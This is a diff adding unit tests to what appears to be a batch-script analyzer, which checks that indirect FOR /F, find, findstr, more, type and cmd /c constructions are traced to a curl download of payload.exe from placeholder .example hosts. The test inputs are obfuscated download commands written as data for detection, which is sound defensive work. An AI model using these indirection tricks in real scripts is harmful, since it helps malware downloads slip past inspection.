@@ -2766,6 +2766,52 @@ for /f "tokens=* delims=" %%U in ('more ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_more_plus_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo header>url.txt
+echo https://for-f-more-plus.example/payload.exe>>url.txt
+for /f "tokens=* delims=" %%U in ('more +1 url.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-more-plus.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F more +N source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_more_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo noise>first.txt
+echo https://for-f-more-multi.example/payload.exe>second.txt
+for /f "tokens=* delims=" %%U in ('more first.txt second.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-more-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file more source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_find_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>web.txt
@@ -2789,6 +2835,75 @@ for /f "tokens=* delims=" %%U in ('find "https://" web.txt') do curl -o payload.
     }
 
     #[test]
+    fn for_f_find_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo noise>first.txt
+echo https://for-f-find-multi.example/payload.exe>second.txt
+for /f "tokens=* delims=" %%U in ('find "https://" first.txt second.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-find-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file find source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://for-f-findstr-file.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /i "https://" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo https://for-f-findstr-multi.example/payload.exe>first.txt
+echo noise>second.txt
+for /f "tokens=* delims=" %%U in ('findstr /i "https://" first.txt second.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file findstr source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_sort_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>urls.txt
@@ -2806,6 +2921,51 @@ for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o
                 )
             }),
             "FOR /F sort file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_cmd_c_type_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('cmd /c type url.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-cmd-c-type.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F cmd /c type source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_type_reads_multiple_generated_file_sources() {
+        let report = analyze(
+            br#"echo noise>first.txt
+echo https://for-f-type-multi.example/payload.exe>second.txt
+for /f "tokens=* delims=" %%U in ('type first.txt second.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-type-multi.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F multi-file type source did not feed later curl: {:?}\n{}",
             report.traits,
             report.deobfuscated
         );
@@ -9355,6 +9515,77 @@ echo %MARK%
     }
 
     #[test]
+    fn synth_find_reads_multiple_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://find-multi.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"find "https://" first.txt second.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://find-multi.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_findstr_reads_tracked_file_argument() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "web.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\nhttps://findstr-file.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"findstr /i "https://" web.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://findstr-file.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_findstr_reads_multiple_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://findstr-multi.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"findstr /i "https://" first.txt second.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://findstr-multi.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
     fn synth_sort_reads_tracked_file_argument() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -9375,6 +9606,109 @@ echo %MARK%
                 "zeta".to_string()
             ]
         );
+    }
+
+    #[test]
+    fn synth_cmd_c_runs_child_pipeline() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "url.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://cmd-c-type.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("cmd /c type url.txt", &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://cmd-c-type.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_cmd_attached_c_runs_child_pipeline() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "url.txt".to_string(),
+            FsEntry::Content {
+                content: b"https://cmd-attached-c.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"cmd /c"type url.txt""#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://cmd-attached-c.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_type_concatenates_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"one\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"two\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("type first.txt second.txt", &mut env);
+
+        assert_eq!(lines, vec!["one".to_string(), "two".to_string()]);
+    }
+
+    #[test]
+    fn synth_more_plus_reads_tracked_file_argument() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "url.txt".to_string(),
+            FsEntry::Content {
+                content: b"header\r\nhttps://more-plus.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("more +2 url.txt", &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://more-plus.example/payload.exe".to_string()]
+        );
+    }
+
+    #[test]
+    fn synth_more_concatenates_tracked_file_arguments() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "first.txt".to_string(),
+            FsEntry::Content {
+                content: b"one\r\n".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "second.txt".to_string(),
+            FsEntry::Content {
+                content: b"two\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline("more first.txt second.txt", &mut env);
+
+        assert_eq!(lines, vec!["one".to_string(), "two".to_string()]);
     }
 
     #[test]
